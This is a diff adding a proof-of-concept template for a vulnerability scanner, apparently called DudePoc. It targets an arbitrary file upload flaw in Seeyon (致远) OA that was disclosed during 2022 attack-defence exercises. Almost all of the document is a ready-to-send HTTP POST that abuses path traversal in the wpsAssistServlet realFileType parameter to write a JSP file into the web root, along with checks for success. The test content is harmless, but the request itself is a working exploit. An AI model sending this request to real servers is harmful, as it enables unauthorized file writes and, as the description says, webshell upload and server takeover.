@@ -1,0 +1,23 @@
+﻿<DudePoc_Name>致远 OA 任意文件上传</DudePoc_Name>
+<DudePoc_Description>2022攻防演习期间，致远OA被曝存在任意文件上传漏洞，攻击者可以利用漏洞直接上传webshell获取服务器权限。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/dude.jsp&fileId=1 HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Accept-Encoding: gzip
+Content-Type: multipart/form-data; boundary=6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
+Content-Disposition: form-data; name="upload"; filename="deC08B.txt"
+Content-Type: application/octet-stream
+
+12345
+--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4--
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>success</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
